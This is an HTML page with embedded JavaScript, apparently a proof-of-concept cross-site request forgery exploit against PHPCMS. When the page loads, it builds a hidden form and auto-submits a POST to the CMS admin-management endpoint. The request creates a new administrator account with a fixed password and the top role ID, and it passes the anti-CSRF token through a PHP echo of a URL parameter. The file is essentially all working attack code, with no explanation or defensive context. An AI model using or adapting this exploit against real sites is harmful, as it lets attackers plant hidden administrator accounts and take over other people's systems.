<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>phpcms csrf 加管理</title>
    <script type="text/javascript">
    gum = function(){
    var u = {
        'version':'1140213',
        'domain':'{{domain}}',
        'backinfo':{},
        'author': 'https://github.com/quininer/gum'
    };
    u.e = function(code){try{return eval(code)}catch(e){return ''}};
    u.name = function(names){
        return document.getElementsByTagName(names);
    };
    u.html = function(){
            return u.name('html')[0]
                    ||document.write('<html>')
                    ||u.name('html')[0];
    };
    u.addom = function(html, doming, hide){
        (!doming)&&(doming = u.html());
        var temp = document.createElement('span');
        temp.innerHTML = html;
        var doms = temp.children[0];
        (hide)&&(doms.style.display = 'none');
        doming.appendChild(doms);
        return doms;
    };
    u.post = function(url, data){
        var form = u.addom("<form method='POST'>", u.html(), true);
        form.action = url;
        for(var name in data){
            var input = document.createElement('input');
            input.name = name;
            input.value = data[name];
            form.appendChild(input);
        };
        form.submit();
    };
    return u;
}();
var timestamp = (Date.parse(new Date())) / 1000;
gum.post('http://192.168.1.20/phpcms/install_package/index.php?m=admin&c=admin_manage&a=add', {
    'info[username]': 'test_' + 'aaaaa',
    'info[password]': '123123',
    'info[pwdconfirm]': '123123',
    'info[email]': '123@qq.com',
    'info[realname]': '',
    'info[roleid]': '1',
    'dosubmit': '提交',
    'pc_hash': '<?php echo $_GET['pc_hash']; ?>'
});
    </script>
  </head>
  <body>
  </body>
</html>